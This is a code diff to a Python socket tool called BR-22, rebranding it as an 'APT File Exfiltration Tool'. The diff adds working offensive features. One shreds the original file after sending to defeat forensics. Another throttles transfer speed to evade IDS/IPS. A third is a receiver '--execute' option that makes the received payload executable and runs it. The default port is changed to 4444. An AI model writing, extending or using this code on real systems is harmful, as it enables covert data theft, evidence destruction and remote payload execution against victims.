@@ -1,9 +1,12 @@
+#!/usr/bin/env python3
 import socket
 import os
 import sys
 import zipfile
 import hashlib
 import argparse
+import time
+import subprocess
 from tqdm import tqdm
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
@@ -23,6 +26,16 @@ def calculate_md5(file_path):
         for chunk in iter(lambda: f.read(4096), b""):
             hash_md5.update(chunk)
     return hash_md5.hexdigest()
+
+def secure_shred(file_path, quiet):
+    """Overwrites file with null bytes before deletion (Anti-Forensics)"""
+    if not quiet: print(f"[*] Shredding original file '{file_path}' to prevent recovery...")
+    filesize = os.path.getsize(file_path)
+    with open(file_path, "ba+") as f:
+        f.seek(0)
+        f.write(os.urandom(filesize))
+    os.remove(file_path)
+    if not quiet: print("[+] File securely shredded.")
 
 def prepare_target(target_path, quiet):
     if os.path.isfile(target_path):
@@ -59,10 +72,9 @@ def send_data(args):
     metadata = f"{os.path.basename(file_to_send)}|{filesize}|{file_md5}|{is_zipped}"
     padded_metadata = metadata.ljust(512, ' ').encode()
 
-    # Agar password hai, toh Encrypted (1), warna Plaintext (0)
     if args.password:
         if not args.quiet: print("[*] Mode: ENCRYPTED (AES-256)")
-        s.send(b'1')  # Flag indicating encryption is ON
+        s.send(b'1')
         key = derive_key(args.password)
         iv = os.urandom(16)
         s.send(iv)
@@ -70,15 +82,21 @@ def send_data(args):
         s.send(encryptor.update(padded_metadata))
     else:
         if not args.quiet: print("[*] Mode: PLAINTEXT (Fast Transfer)")
-        s.send(b'0')  # Flag indicating encryption is OFF
+        s.send(b'0')
         s.send(padded_metadata)
 
     progress = None
     if not args.quiet:
         progress = tqdm(range(filesize), f"Sending", unit="B", unit_scale=True, unit_divisor=1024)
     
+    throttle_delay = 0
+    if args.throttle:
+        throttle_delay = buffer_size / (args.throttle * 1024)
+        if not args.quiet: print(f"[*] Throttle Enabled: Limiting to {args.throttle} KB/s")
+
     with open(file_to_send, "rb") as f:
         while True:
+            start_time = time.time()
             bytes_read = f.read(buffer_size)
             if not bytes_read:
                 break
@@ -89,10 +107,19 @@ def send_data(args):
                 s.sendall(bytes_read)
                 
             if progress: progress.update(len(bytes_read))
+            
+            # Anti-IDS Throttling Logic
+            if args.throttle:
+                elapsed = time.time() - start_time
+                if elapsed < throttle_delay:
+                    time.sleep(throttle_delay - elapsed)
     
     s.close()
     if is_zipped: os.remove(file_to_send)
     if not args.quiet: print("\n[+] Transfer Complete!")
+
+    if args.shred and not is_zipped:
+        secure_shred(args.target, args.quiet)
 
 def receive_data(args):
     buffer_size = args.buffer * 1024
@@ -105,7 +132,6 @@ def receive_data(args):
     client_socket, address = s.accept()
     if not args.quiet: print(f"[+] Connection received from {address[0]}")
 
-    # Check first byte to see if sender used encryption
     is_encrypted = client_socket.recv(1) == b'1'
 
     if is_encrypted:
@@ -122,7 +148,7 @@ def receive_data(args):
         dec_metadata = decryptor.update(enc_metadata).decode('utf-8', errors='ignore').strip()
     else:
         if args.password:
-            print("\n[-] WARNING: You provided a password, but the sender sent data in PLAINTEXT. Ignoring password.")
+            print("\n[-] WARNING: Sender sent PLAINTEXT. Ignoring password.")
         dec_metadata = client_socket.recv(512).decode('utf-8', errors='ignore').strip()
     
     try:
@@ -168,37 +194,58 @@ def receive_data(args):
             zip_ref.extractall(extract_dir)
         os.remove(filename)
         if not args.quiet: print(f"[+] Payload extracted to '{extract_dir}'")
+        filename = extract_dir # update reference if needed for execution
+
+    # Post-Exploitation Execution
+    if args.execute and not is_zipped:
+        if not args.quiet: print(f"[*] Post-Transfer Execution: Running {filename}...")
+        try:
+            os.chmod(filename, 0o777)  # Give execute permissions in Linux
+            subprocess.Popen(f"./{filename}" if os.name != 'nt' else filename, shell=True)
+            if not args.quiet: print("[+] Payload Executed Successfully!")
+        except Exception as e:
+            print(f"[-] Execution Failed: {e}")
 
 def main():
-    banner = """
+    # Clean Raw String Banner (No warnings)
+    banner = r"""
   ____  ____       ___  ___  
  | __ )|  _ \     |__ \|__ \ 
  |  _ \| |_) |_____ / /  / / 
  | |_) |  _ <_____|/ /_ / /_ 
  |____/|_| \_\    /____/____|
                              
-    BR-22: Advanced P2P File Transfer Tool
+    BR-22 v5.0: The Ultimate APT File Exfiltration Tool
     """
     
+    # Handle 'help' smoothly before argparse crashes
+    if len(sys.argv) == 1 or (len(sys.argv) == 2 and sys.argv[1].lower() in ["help", "-h", "--help"]):
+        print(banner)
+        print("Usage:")
+        print("  Receiver: python3 br22.py -m receive [--password SecretKey] [--execute]")
+        print("  Sender:   python3 br22.py -m send -t payload.exe -i 192.168.1.10 [--password SecretKey] [--shred] [--throttle 500]")
+        print("\nRun 'python3 br22.py -h' for advanced options.")
+        sys.exit(0)
+
     parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter, description=banner)
 
     core = parser.add_argument_group('Core Options')
     core.add_argument("-m", "--mode", choices=["send", "receive"], required=True, help="Set operation mode (send / receive)")
-    # PASSWORD AB OPTIONAL HAI (required=False)
     core.add_argument("--password", required=False, help="Optional: Authentication Key for AES-256 Encryption")
     
     target = parser.add_argument_group('Target Options')
-    target.add_argument("-t", "--target", help="File or Folder path to send (Required if mode=send)")
+    target.add_argument("-t", "--target", help="File/Folder path to send (Required if mode=send)")
     target.add_argument("-i", "--ip", help="Target IP Address (Required if mode=send)")
-    target.add_argument("-p", "--port", type=int, default=DEFAULT_PORT, help=f"Target/Bind Port (Default: {DEFAULT_PORT})")
+    target.add_argument("-p", "--port", type=int, default=4444, help="Target/Bind Port (Default: 4444)")
     
-    adv = parser.add_argument_group('Advanced Tuning')
-    adv.add_argument("-b", "--buffer", type=int, default=DEFAULT_BUFFER, help=f"Buffer size in KB (Default: {DEFAULT_BUFFER})")
-    adv.add_argument("-q", "--quiet", action="store_true", help="Stealth Mode: Hide progress bar and standard output")
-
-    if len(sys.argv) == 1:
-        parser.print_help()
-        sys.exit(1)
+    adv = parser.add_argument_group('Advanced Multi-Level Features (APT)')
+    adv.add_argument("--shred", action="store_true", help="(Sender) Securely overwrite and delete the original file after sending")
+    adv.add_argument("--throttle", type=int, help="(Sender) Limit transfer speed in KB/s (Evade IDS/IPS)")
+    adv.add_argument("--execute", action="store_true", help="(Receiver) Auto-execute the file upon successful receipt")
+    
+    tune = parser.add_argument_group('Performance & Stealth')
+    tune.add_argument("-b", "--buffer", type=int, default=64, help="Buffer size in KB (Default: 64)")
+    tune.add_argument("-q", "--quiet", action="store_true", help="Stealth Mode: Hide standard output and progress bar")
 
     args = parser.parse_args()
 
